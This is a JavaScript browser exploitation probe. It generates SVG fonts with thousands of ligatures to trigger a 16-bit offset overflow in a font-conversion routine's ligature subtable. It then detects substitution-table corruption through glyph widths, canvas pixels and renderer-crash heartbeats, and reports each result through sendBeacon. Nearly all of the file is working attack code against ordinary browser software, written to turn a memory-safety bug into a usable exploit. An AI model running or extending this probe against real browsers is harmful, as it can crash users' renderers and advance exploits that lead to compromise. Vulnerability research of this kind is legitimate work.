// p253 — SVG-to-OTF GSUB Placeholder uint16_t overflow exploitation probe
//
// SVGToOTFFontConversion.cpp appendLigatureSubtable:
//   Line 798: overwrite16(subtableLocation + 2, m_result.size() - subtableLocation)
//   Coverage table offset written as uint16_t. With >65535 bytes of subtable data,
//   the offset wraps → FreeType reads coverage table from wrong location.
//
//   Line 776: overwrite16(subtableLocation + 6 + 2*i, ...)
//   LigatureSet offsets also overflow for high-index sets.
//
// Strategy:
//   A) Create SVG font with exactly enough ligatures to overflow
//   B) Compare rendering vs a safe font (fewer ligatures)
//   C) Measure timing and crash behavior
//   D) Test with text that exercises GSUB ligature lookups
//
// Beacon prefix: V253-

(function() {
  var BQ = [], BS = false;
  function B(tag, body) {
    BQ.push([tag, body || '']);
    if (!BS) drain();
  }
  function drain() {
    if (!BQ.length) { BS = false; return; }
    BS = true;
    var it = BQ.shift();
    try {
      navigator.sendBeacon('/beacon/V253-' + it[0] + '?t=' + Date.now(), it[1]);
    } catch(e) {}
    setTimeout(drain, 15);
  }

  B('BOOT');

  var baseChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

  function buildSVGFont(familyName, ligCount) {
    var parts = [];
    parts.push('<?xml version="1.0"?>');
    parts.push('<svg xmlns="http://www.w3.org/2000/svg">');
    parts.push('<defs><font id="F" horiz-adv-x="500">');
    parts.push('<font-face font-family="' + familyName + '" units-per-em="1000" ascent="800" descent="-200"/>');
    parts.push('<missing-glyph horiz-adv-x="500" d="M0 0h500v800h-500z"/>');

    for (var i = 0; i < baseChars.length; i++) {
      parts.push('<glyph unicode="' + baseChars[i] + '" horiz-adv-x="600" d="M100 0h400v700h-400z"/>');
    }

    var n = 0;
    for (var a = 0; a < baseChars.length && n < ligCount; a++) {
      for (var b = 0; b < baseChars.length && n < ligCount; b++) {
        var lig = baseChars[a] + baseChars[b];
        // Each ligature glyph has a distinctive advance width based on index
        // This lets us detect if GSUB substitution produced wrong glyphs
        var adv = 800 + (n % 400);
        parts.push('<glyph unicode="' + lig + '" horiz-adv-x="' + adv + '" d="M0 0h' + adv + 'v700h-' + adv + 'z"/>');
        n++;
      }
    }

    parts.push('</font></defs></svg>');
    return parts.join('\n');
  }

  function loadSVGFont(familyName, svgText, cb) {
    var blob = new Blob([svgText], {type: 'image/svg+xml'});
    var url = URL.createObjectURL(blob);

    var style = document.createElement('style');
    style.textContent = '@font-face { font-family: "' + familyName + '"; src: url("' + url + '") format("svg"); }';
    document.head.appendChild(style);

    // Force usage to trigger conversion
    var div = document.createElement('div');
    div.style.cssText = 'position:absolute;left:-9999px;font-family:"' + familyName + '",monospace;font-size:48px;';
    div.textContent = 'abcdefghijklmnop';
    document.body.appendChild(div);

    setTimeout(function() {
      cb(url, div);
    }, 3000);
  }

  // Test A: Safe font (500 ligatures, well under overflow threshold)
  function testA() {
    B('A-START');
    try {
      var svg = buildSVGFont('Safe253', 500);
      B('A-SVG-' + svg.length + 'B');

      loadSVGFont('Safe253', svg, function(url, div) {
        try {
          var c = document.createElement('canvas');
          c.width = 1200; c.height = 100;
          var ctx = c.getContext('2d');
          ctx.font = '48px "Safe253"';

          // Measure individual characters
          var wA = ctx.measureText('a').width;
          var wAB = ctx.measureText('ab').width;
          var wABC = ctx.measureText('abc').width;
          B('A-WIDTHS', 'a=' + wA.toFixed(1) + ' ab=' + wAB.toFixed(1) + ' abc=' + wABC.toFixed(1));

          // If ligature substitution works, 'ab' width should differ from 2*'a' width
          var ligActive = Math.abs(wAB - 2 * wA) > 1;
          B('A-LIG-' + (ligActive ? 'YES' : 'NO'));

          // Measure multiple ligature pairs
          var pairs = ['ab','cd','ef','gh','ij','kl','mn','op','qr','st'];
          var widths = [];
          for (var i = 0; i < pairs.length; i++) {
            widths.push(pairs[i] + ':' + ctx.measureText(pairs[i]).width.toFixed(1));
          }
          B('A-PAIRS', widths.join(' '));

          // Canvas pixel test
          ctx.clearRect(0, 0, 1200, 100);
          ctx.fillText('abcdefghijklmnop', 10, 60);
          var px = ctx.getImageData(0, 0, 1200, 100).data;
          var nonZero = 0;
          for (var p = 3; p < px.length; p += 4) {
            if (px[p] > 0) nonZero++;
          }
          B('A-PIX-' + nonZero);

          URL.revokeObjectURL(url);
        } catch(e) {
          B('A-ERR-' + e.message.substring(0, 50));
        }
        setTimeout(testB, 500);
      });
    } catch(e) {
      B('A-FAIL-' + e.message.substring(0, 50));
      setTimeout(testB, 500);
    }
  }

  // Test B: Overflow font (7000 ligatures, triggers uint16_t truncation)
  function testB() {
    B('B-START');
    try {
      var svg = buildSVGFont('Ovf253', 7000);
      B('B-SVG-' + svg.length + 'B');

      loadSVGFont('Ovf253', svg, function(url, div) {
        try {
          var c = document.createElement('canvas');
          c.width = 1200; c.height = 100;
          var ctx = c.getContext('2d');
          ctx.font = '48px "Ovf253"';

          var wA = ctx.measureText('a').width;
          var wAB = ctx.measureText('ab').width;
          var wABC = ctx.measureText('abc').width;
          B('B-WIDTHS', 'a=' + wA.toFixed(1) + ' ab=' + wAB.toFixed(1) + ' abc=' + wABC.toFixed(1));

          var ligActive = Math.abs(wAB - 2 * wA) > 1;
          B('B-LIG-' + (ligActive ? 'YES' : 'NO'));

          // Same pairs as safe font for comparison
          var pairs = ['ab','cd','ef','gh','ij','kl','mn','op','qr','st'];
          var widths = [];
          for (var i = 0; i < pairs.length; i++) {
            widths.push(pairs[i] + ':' + ctx.measureText(pairs[i]).width.toFixed(1));
          }
          B('B-PAIRS', widths.join(' '));

          // Canvas pixel test
          ctx.clearRect(0, 0, 1200, 100);
          ctx.fillText('abcdefghijklmnop', 10, 60);
          var px = ctx.getImageData(0, 0, 1200, 100).data;
          var nonZero = 0;
          for (var p = 3; p < px.length; p += 4) {
            if (px[p] > 0) nonZero++;
          }
          B('B-PIX-' + nonZero);

          URL.revokeObjectURL(url);
        } catch(e) {
          B('B-ERR-' + e.message.substring(0, 50));
        }
        setTimeout(testC, 500);
      });
    } catch(e) {
      B('B-FAIL-' + e.message.substring(0, 50));
      setTimeout(testC, 500);
    }
  }

  // Test C: Maximum overflow (3844 = 62^2 ligatures = all 2-char combos)
  // Uses ALL possible 2-char combinations from baseChars
  // Then renders many different ligature pairs to detect GSUB corruption effects
  function testC() {
    B('C-START');
    try {
      // 62^2 = 3844 ligatures — each first glyph appears 62 times
      // Subtable: 3844 pairs * ~12 bytes/pair + overhead ≈ 50K (might not overflow)
      // Actually let's use 8000 to ensure overflow
      var svg = buildSVGFont('Max253', 8000);
      B('C-SVG-' + svg.length + 'B');

      loadSVGFont('Max253', svg, function(url, div) {
        try {
          var c = document.createElement('canvas');
          c.width = 1200; c.height = 100;
          var ctx = c.getContext('2d');
          ctx.font = '48px "Max253"';

          // Test a wide range of ligature pairs
          // Each ligature has advance width 800 + (index % 400)
          // If GSUB corruption maps to wrong glyphs, widths will be unexpected
          var testPairs = [];
          for (var i = 0; i < 62; i += 5) {
            for (var j = 0; j < 62; j += 10) {
              testPairs.push(baseChars[i] + baseChars[j]);
            }
          }

          var results = [];
          var anomalies = 0;
          for (var k = 0; k < testPairs.length; k++) {
            var pair = testPairs[k];
            var w = ctx.measureText(pair).width;
            // Expected: if ligature resolved, single-glyph width based on index
            // If ligature NOT resolved (GSUB corrupted), width = sum of individual chars
            var w1 = ctx.measureText(pair[0]).width;
            var w2 = ctx.measureText(pair[1]).width;
            var isLig = Math.abs(w - (w1 + w2)) > 1;

            if (k < 20) {
              results.push(pair + ':' + w.toFixed(0) + (isLig ? 'L' : 'N'));
            }
            if (!isLig) anomalies++;
          }
          B('C-SAMPLE', results.join(' '));
          B('C-TOTAL-' + testPairs.length + '-NOLIG-' + anomalies);

          // Canvas rendering check
          ctx.clearRect(0, 0, 1200, 100);
          ctx.fillText('aAbBcCdDeEfFgGhH', 10, 60);
          var px = ctx.getImageData(0, 0, 1200, 100).data;
          var nonZero = 0;
          for (var p = 3; p < px.length; p += 4) {
            if (px[p] > 0) nonZero++;
          }
          B('C-PIX-' + nonZero);

          URL.revokeObjectURL(url);
        } catch(e) {
          B('C-ERR-' + e.message.substring(0, 50));
        }
        setTimeout(testD, 500);
      });
    } catch(e) {
      B('C-FAIL-' + e.message.substring(0, 50));
      setTimeout(testC, 500);
    }
  }

  // Test D: Crash detection via heartbeat
  // Load overflow font and do heavy GSUB work, check if renderer survives
  function testD() {
    B('D-START');
    try {
      var svg = buildSVGFont('Crash253', 9000);
      B('D-SVG-' + svg.length + 'B');

      loadSVGFont('Crash253', svg, function(url, div) {
        try {
          var c = document.createElement('canvas');
          c.width = 2000; c.height = 200;
          var ctx = c.getContext('2d');
          ctx.font = '32px "Crash253"';

          // Render many different ligature strings to exercise corrupted GSUB
          var rendered = 0;
          for (var round = 0; round < 100; round++) {
            var text = '';
            for (var ch = 0; ch < 50; ch++) {
              text += baseChars[(round * 7 + ch) % 62] + baseChars[(round * 13 + ch) % 62];
            }
            ctx.fillText(text, 0, (round % 5) * 40 + 20);
            rendered++;
          }
          B('D-RENDERED-' + rendered);

          // If we get here, renderer survived the corrupted GSUB
          B('D-SURVIVED');

          URL.revokeObjectURL(url);
        } catch(e) {
          B('D-ERR-' + e.message.substring(0, 50));
        }
        B('DONE');
      });
    } catch(e) {
      B('D-FAIL-' + e.message.substring(0, 50));
      B('DONE');
    }
  }

  // Start test chain
  setTimeout(testA, 100);

})();
